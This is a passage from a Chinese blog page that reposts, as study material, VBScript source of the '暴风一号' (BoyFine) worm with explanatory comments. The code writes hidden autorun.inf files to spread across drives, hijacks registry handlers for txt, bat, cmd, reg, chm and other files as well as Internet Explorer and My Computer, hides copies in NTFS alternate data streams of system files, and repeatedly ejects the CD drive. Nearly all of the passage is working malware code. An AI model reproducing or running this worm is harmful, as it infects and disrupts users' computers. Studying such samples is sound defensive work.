VBSCode=GetCode(WScript.ScriptFullName)</span><br><span class="line">    <span class="keyword">If</span> FSO.FileExists(InfPath)=<span class="literal">False</span> <span class="keyword">Or</span> FSO.FileExists(VBSPath)=<span class="literal">False</span> <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> CreateFile(VBSCode, VBSPath)</span><br><span class="line">        <span class="keyword">Call</span> SetHiddenAttr(VBSPath)</span><br><span class="line">        StrInf=<span class="string">"[AutoRun]"</span>&amp;VBCRLF&amp;<span class="string">"Shellexecute=WScript.exe "</span>&amp;VirusName&amp;<span class="string">" ""AutoRun"""</span>&amp;VBCRLF&amp;<span class="string">"shell/open=打开(&amp;O)"</span>&amp;VBCRLF&amp;<span class="string">"shell/open/command=WScript.exe "</span>&amp;VirusName&amp;<span class="string">" </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">""AutoRun"""</span>&amp;VBCRLF&amp;<span class="string">"shell/open/Default=1"</span>&amp; VBCRLF&amp;<span class="string">"shell/explore=资源管理器(&amp;X)"</span>&amp;VBCRLF&amp;<span class="string">"shell/explore/command=WScript.exe "</span>&amp;VirusName&amp;<span class="string">" ""AutoRun"""</span></span><br><span class="line">        <span class="keyword">Call</span> KillImmunity(D)</span><br><span class="line">        <span class="keyword">Call</span> CreateFile(StrInf, InfPath)</span><br><span class="line">        <span class="keyword">Call</span> SetHiddenAttr(InfPath)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变txt格式文件关联</span></span><br><span class="line"><span class="keyword">Sub</span> SetTxtFileAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/txtfile/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变ini格式文件关联</span></span><br><span class="line"><span class="keyword">Sub</span> SetIniFileAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inifile/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变inf格式文件关联</span></span><br><span class="line"><span class="keyword">Sub</span> SetInfFileAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inffile/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变bat格式文件关联</span></span><br><span class="line"><span class="keyword">Sub</span> SetBatFileAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/batfile/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变cmd格式文件关联</span></span><br><span class="line"><span class="keyword">Sub</span> SetCmdFileAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变hlp格式文件关联</span></span><br><span class="line"><span class="keyword">Sub</span> SethlpFileAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变reg格式文件关联</span></span><br><span class="line"><span class="keyword">Sub</span> SetRegFileAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变chm格式文件关联</span></span><br><span class="line"><span class="keyword">Sub</span> SetchmFileAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//篡改IE启动设置</span></span><br><span class="line"><span class="keyword">Sub</span> SetIEAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" OIE "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/Applications/iexplore.exe/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_CLASSES_ROOT/CLSID/&#123;871C5380-42A0-1069-A2EA-08002B30309D&#125;/shell/OpenHomePage/Command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变我的电脑的打开关联，包括Win+E</span></span><br><span class="line"><span class="keyword">Sub</span> SetMyComputerAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value1,Value2</span><br><span class="line">    Value1=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" OMC "</span></span><br><span class="line">    Value2=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" EMC "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_CLASSES_ROOT/CLSID/&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;/shell/"</span>, <span class="string">""</span>, <span class="string">"REG_SZ"</span>)</span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_CLASSES_ROOT/CLSID/&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;/shell/open/command/"</span>, Value1, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_CLASSES_ROOT/CLSID/&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;/shell/explore/command/"</span>, Value2, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//获得系统驱动盘符名 Drive.SerialNumber 盘符序列号 c--&gt;驱动器 C: - 固定&lt;BR&gt;序列号：-1598325125、d--&gt;驱动器 D: - 固定&lt;BR&gt;序列号：237835280、e、f。</span></span><br><span class="line"><span class="keyword">Function</span> GetSerialNumber(Drv)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Set</span> d=fso.GetDrive(Drv)</span><br><span class="line">    GetSerialNumber=d.SerialNumber <span class="comment">'// 返回十进制序列号，用于唯一标识一个磁盘卷。Select Case d.DriveType     Case 0: t = "未知"    Case 1: t = "可移动"    Case 2: t = "固定"</span></span><br><span class="line">                           <span class="comment">'// Case 3: t = "网络"    Case 4: t = "CD-ROM"    Case 5: t = "RAM 磁盘"      End Select</span></span><br><span class="line">    GetSerialNumber=<span class="built_in">Replace</span>(GetSerialNumber,<span class="string">"-"</span>,<span class="string">""</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//获得蠕虫病毒路径   &amp;表示字符串相加  GetSpecialFolder 返回指定的特殊文件夹</span></span><br><span class="line"><span class="keyword">Function</span> GetMainVirus(N)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    MainVirusName=GetSerialNumber(GetSystemDrive())&amp;<span class="string">".vbs"</span></span><br><span class="line">    <span class="keyword">If</span> GetFileSystemType(GetSystemDrive())=<span class="string">"NTFS"</span> <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">If</span> N=<span class="number">1</span> <span class="keyword">Then</span> <span class="comment">'//System 文件夹，包含库、字体和设备驱动程序文件。 SystemFolder</span></span><br><span class="line">              GetMainVirus=Fso.GetSpecialFolder(N)&amp;<span class="string">"/smss.exe:"</span>&amp;MainVirusName <span class="comment">'//返回 如c:/windows/system32/smss.exe:72161642.vbs</span></span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">        <span class="keyword">If</span> N=<span class="number">0</span> <span class="keyword">Then</span> <span class="comment">'//Windows 文件夹，包含 Windows 操作系统安装的文件。 WindowsFolder</span></span><br><span class="line">              GetMainVirus=Fso.GetSpecialFolder(N)&amp;<span class="string">"/explorer.exe:"</span>&amp;MainVirusName <span class="comment">'//返回 如c:/windows/explorer.exe:72161642.vbs</span></span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">          GetMainVirus=Fso.GetSpecialFolder(N)&amp;<span class="string">"/"</span>&amp;MainVirusName</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//返回指定路径vbs脚本的运行个数</span></span><br><span class="line"><span class="keyword">Function</span> VBSProcessCount(VBSPath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> WMIService, ProcessList, Process</span><br><span class="line">    VBSProcessCount=<span class="number">0</span></span><br><span class="line">    <span class="keyword">Set</span> WMIService=<span class="built_in">GetObject</span>(<span class="string">"winmgmts://./root/cimv2"</span>)</span><br><span class="line">    <span class="keyword">Set</span> ProcessList=WMIService.ExecQuery(<span class="string">"Select * from Win32_Process Where "</span>&amp;<span class="string">"Name='cscript.exe' or Name='wscript.exe' or Name='svchost.exe'"</span>)</span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> Process <span class="keyword">in</span> ProcessList</span><br><span class="line">        <span class="keyword">If</span> <span class="built_in">InStr</span>(Process.CommandLine, VBSPath)&gt;<span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">            VBSProcessCount=VBSProcessCount+<span class="number">1</span></span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//'用来计数wscript进程的个数，如果大于等于3个那么返回True</span></span><br><span class="line"><span class="keyword">Function</span> PreDblInstance()</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    PreDblInstance=<span class="literal">False</span></span><br><span class="line">    <span class="keyword">If</span> VBSProcessCount(WScript.ScriptFullName)&gt;= <span class="number">3</span> <span class="keyword">Then</span></span><br><span class="line">        PreDblInstance=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//获取快捷方式的vbs脚本地址</span></span><br><span class="line"><span class="keyword">Function</span> GetTargetPath(LnkPath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Shortcut</span><br><span class="line">    <span class="keyword">Set</span> Shortcut=WshShell.CreateShortcut(LnkPath)</span><br><span class="line">    GetTargetPath=Shortcut.TargetPath</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//读取文件 返回 TextStream</span></span><br><span class="line"><span class="keyword">Function</span> GetCode(FullPath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> FileText</span><br><span class="line">    <span class="keyword">Set</span> FileText=FSO.OpenTextFile(FullPath, <span class="number">1</span>) <span class="comment">'//打开指定的文件并返回一个 TextStream 对象，可以读取、写入此对象或将其追加到文件。  </span></span><br><span class="line">                           <span class="comment">'// 1 以只读模式打开文件。不能对此文件进行写操作。 </span></span><br><span class="line">    GetCode=FileText.ReadAll <span class="comment">'//读入全部 TextStream 文件并返回结果字符串</span></span><br><span class="line">    FileText.Close</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//获得注册表 版本键值 获取windows版本</span></span><br><span class="line"><span class="keyword">Function</span> GetVersion()</span><br><span class="line">    <span class="keyword">Dim</span> VerInfo</span><br><span class="line">    VerInfo=<span class="string">"HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Ver"</span></span><br><span class="line">    <span class="keyword">If</span> ReadReg(VerInfo)=<span class="string">""</span> <span class="keyword">Then</span></span><br><span class="line">        GetVersion=<span class="number">0</span></span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        GetVersion=<span class="built_in">CInt</span>(ReadReg(VerInfo)) <span class="comment">'//CInt 返回表达式，此表达式已被转换为 Integer 子类型的 Variant。</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//网页文件BFAlert.hta</span></span><br><span class="line"><span class="keyword">Sub</span> VirusAlert()</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> HtaPath,HtaCode</span><br><span class="line">    HtaPath=Fso.GetSpecialFolder(<span class="number">1</span>)&amp;<span class="string">"/BFAlert.hta"</span></span><br><span class="line">    HtaCode=<span class="string">"&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;暴风一号&lt;/TITLE&gt;"</span>&amp;VBCRLF&amp;<span class="string">"&lt;HTA:APPLICATION APPLICATIONNAME=""BoyFine V1.0"" SCROLL=""no"" windowstate=""maximize"" </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">border=""none"""</span>&amp;VBCRLF&amp;<span class="string">"SINGLEINSTANCE=""yes"" CAPTION=""no"" contextMenu=""no"" ShowInTaskBar=""no"" selection=""no""&gt;"</span>&amp;VBCRLF&amp;<span class="string">"&lt;/HEAD&gt;&lt;BODY bgcolor=#000000&gt;&lt;DIV align </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=""center""&gt;"</span>&amp;VBCRLF&amp;<span class="string">"&lt;font style=""font-size:3500%;font-family:Wingdings;color=red""&gt;N&lt;/font&gt;&lt;BR&gt;"</span>&amp;VBCRLF&amp;<span class="string">"&lt;font style=""font-size:200%;font-family:黑体;color=red""&gt;暴风一号</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/font&gt;"</span>&amp;VBCRLF&amp;<span class="string">"&lt;/DIV&gt;&lt;/BODY&gt;&lt;/HTML&gt;"</span></span><br><span class="line">    <span class="keyword">If</span> FSO.FileExists(HtaPath)=<span class="literal">False</span> <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> CreateFile(HtaCode, HtaPath) <span class="comment">'//创建网页文件BFAlert.hta</span></span><br><span class="line">        <span class="keyword">Call</span> SetHiddenAttr(HtaPath) <span class="comment">'//设置隐藏</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Call</span> Run(HtaPath)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//获得感染注册表时间键</span></span><br><span class="line"><span class="keyword">Function</span> GetInfectedDate()</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> DateInfo</span><br><span class="line">    DateInfo=<span class="string">"HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Date"</span></span><br><span class="line">    <span class="keyword">If</span> ReadReg(DateInfo)=<span class="string">""</span> <span class="keyword">Then</span></span><br><span class="line">        GetInfectedDate=<span class="string">""</span></span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        GetInfectedDate=<span class="built_in">CDate</span>(ReadReg(DateInfo))</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//弹出光驱</span></span><br><span class="line"><span class="keyword">Sub</span> MakeJoke(Times)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> WMP, colCDROMs</span><br><span class="line">    <span class="keyword">Set</span> WMP = <span class="built_in">CreateObject</span>( <span class="string">"WMPlayer.OCX"</span> ) <span class="comment">'//创建WMPlayer.OCX插件对象</span></span><br><span class="line">    <span class="keyword">Set</span> colCDROMs = WMP.cdromCollection <span class="comment">'//系统中光驱</span></span><br><span class="line">    <span class="keyword">If</span> colCDROMs.Count &gt;<span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">For</span> i=<span class="number">1</span> <span class="keyword">to</span> Times</span><br><span class="line">            colCDROMs.Item(<span class="number">0</span>).eject() <span class="comment">'//退出抽取式设备</span></span><br><span class="line">            WScript.Sleep <span class="number">3000</span></span><br><span class="line">            colCDROMs.Item(<span class="number">0</span>).eject()</span><br><span class="line">        <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Set</span> WMP = <span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>转载自<a href="https://blog.csdn.net/ccx_john/article/details/39118211" target="_blank" rel="noopener">暴风一号 病毒 源码学习</a></p>
+</blockquote>
+
+      
+      
+      
+      <!--添加代码开始-->
+      
+        <div class="declare" hidden="hidden"></div>
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/mm_reward_qrcode.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACqElEQVR42u3aQXLjMAwEwPz/07sfiOwZgHSSqtYpFUsymweCHvDrK77+PVyv70+efXpPfueBCw8PD+/Q0F8PMRlEcmfy7fmUfTMFeHh4eNd4yeK+WXUT5Knx4OHh4f1mXv5UOxFJQcLDw8P7i7xia5sMpZwsPDw8vJ/lzbbFSWSQxxavp+Z61oKHh4c3X7GHC/Qn/77S38PDw8Nbd9XbyCAZRPLpLM74ZrR4eHh4F3htKLA5QLBZ7tuAAw8PD+8e71QLasbeN8neBCJ4eHh4F3ibSDS/f1M28kl/HC0eHh7eR3jJq/OBzvB5g63u7+Hh4eEd5c3ig3z7m7OLTXObZODh4eGtefnmtQ0U8nfmk7U6eoWHh4e35p1taOWb4HZzvOrs4eHh4V3jzaKHnJeXnD2s7u/h4eHhjXjtNne2xOdZQfuNb05G4OHh4V3gtXFAC9hEvW24jIeHh3ebl2yg8+bTqRA2n7K63YWHh4d3lJcXgDZi2PToZg0zPDw8vBu85OG2JBw7xRAXsLoNhoeHh7fgJTFEMqC8GTZjtMUDDw8P7/O8U7FFe4AgmZQiIsHDw8O7wMuX4/YAVvLmfLLy4BgPDw/vM7wkSmgHNzs+1ZaTokTh4eHhHeUlzar8nvyYVL6G5+2uN10+PDw8vKO8/LjVpsE/G/Qs5sDDw8O7zZtRZ6VlFuMOI2A8PDy8a7y2MLSx76bptbrw8PDwrsFmB61mbbD8DXmZeTx0hYeHh3eUd+oHfxtDtNHwsKeHh4eHd42XFIOk6ZUv5fn/Z4UBDw8P7zO8fcuqnaazmUN0MgIPDw/vh3h5fDArP09T2Y4NDw8P73fyZqVidmRh2DbDw8PDu8Zrg4BTn27GELW+8PDw8C7w2h/8dRwQT0F+FOBwqIGHh4eX8v4DwHAYPLzsFtMAAAAASUVORK5CYII=" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2024/java-huo-qu-wen-jian-tu-biao/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Java获取文件图标
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/js-huo-qu-iframe-gao-du/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">js获取iframe高度</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    目录，不存在的…
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+  
+  
+      
+    
+    
+  
+  
+    <div style="margin:10px;padding:10px;background:#fff;">
+      <div class="article-entry">
+        <center>留言已关闭
+<script>
+var qqlink = '交流前往<a class="qq" target="_blank" href="https://jq.qq.com/?_wv=1027&k=5jUckY8" title="qq"><i class="icon-qq"></i></a>';
+if(navigator.userAgent.match(/Mobile Safari\//i)) {
+  document.write('<br />' + qqlink);
+} else {
+  document.write('，' + qqlink);
+}
+</script>
+        </center>
+      </div>
+    </div>
+  
+
+
+    <!-- 萌萌的计数器 -->
+    <div>
+    <center>
+    <img src="https://count.getloli.com/@:gddhy?name=%3Agddhy&theme=rule34&padding=7&offset=0&align=top&scale=1&pixelated=1&darkmode=auto" alt=":gddhy" style="max-width: 100%;height: auto;">
+    </center>
+    </div>
+
+
+  
+
+  
+
+  
+
+  
+
+          </div>
+        </div>
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    	<!--2026-->
+    		&copy;<script type="text/javascript">document.write(new Date().getFullYear())</script>  gddhy 
+
+
+      </div>
+      
+      
+      <div class="footer-middle">
+     	<span id="sitetime"></span>
+<script type="text/javascript" src="/js/sitetime.js"></script>
+      </div>
+      
+      	<div class="footer-right">
